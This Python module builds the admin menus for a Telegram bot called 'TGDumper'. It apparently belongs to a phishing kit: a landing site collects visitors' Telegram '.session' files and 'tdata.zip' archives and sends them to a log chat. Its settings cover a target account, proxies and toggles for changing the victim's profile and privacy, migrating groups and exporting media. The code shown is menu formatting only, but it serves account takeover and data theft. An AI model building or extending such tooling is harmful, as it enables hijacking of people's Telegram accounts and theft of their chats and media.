from __future__ import annotations

from aiogram.exceptions import TelegramBadRequest
from aiogram.types import CallbackQuery

from bot.keyboards import BOOL_FIELDS, TEXT_FIELDS
from web.services.migration.settings import settings_repo

FIELD_TITLES = {key: title for key, title in TEXT_FIELDS + BOOL_FIELDS}
FIELD_BACK = {key: "menu:account" for key, _ in TEXT_FIELDS}


async def format_settings() -> str:
	s = await settings_repo.load()
	lines = [
		"<b>👤 Управление аккаунтом</b>",
		"",
		f"• Username: <code>{s.target_username or '—'}</code>",
		f"• Bio: <code>{s.bio or '—'}</code>",
		f"• Целевой аккаунт: <code>{s.target_account or '—'}</code>",
		f"• Группа: <code>{s.notify_group_link or '—'}</code>",
		f"• Сообщение: <code>{s.notify_message or '—'}</code>",
		f"• Прокси: <code>{s.default_proxy or '—'}</code>",
		f"• Параллельность: <code>{s.concurrency}</code>",
		f"• Chat ID логов: <code>{s.bot_chat_id or '—'}</code>",
		"",
		f"Приватность: {'✅' if s.open_privacy else '⬜️'}",
		f"Профиль: {'✅' if s.change_profile else '⬜️'}",
		f"Уведомление: {'✅' if s.notify_group else '⬜️'}",
		f"Перенос групп: {'✅' if s.migrate_groups else '⬜️'}",
		f"Медиа: {'✅' if s.export_media else '⬜️'}",
	]
	return "\n".join(lines)


async def root_text() -> str:
	s = await settings_repo.load()
	return (
		"<b>TGDumper</b>\n"
		"Выберите раздел.\n\n"
		"🌐 <b>Сайт</b> — контент лендинга (аватар, фото, соцсети)\n"
		"👤 <b>Управление аккаунтом</b> — миграция, целевой аккаунт, логи\n\n"
		f"Логи → chat_id: <code>{s.bot_chat_id or '—'}</code>\n"
		"<i>После входа на сайт сюда приходят .session и tdata.zip</i>"
	)


async def account_text() -> str:
	return await format_settings()


async def network_text(extra: str = "") -> str:
	text = await format_settings()
	if extra:
		text += f"\n{extra}"
	return text


async def edit_menu(callback: CallbackQuery, text: str, markup) -> None:
	try:
		await callback.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
	except TelegramBadRequest as error:
		if "message is not modified" not in str(error):
			raise
	await callback.answer()
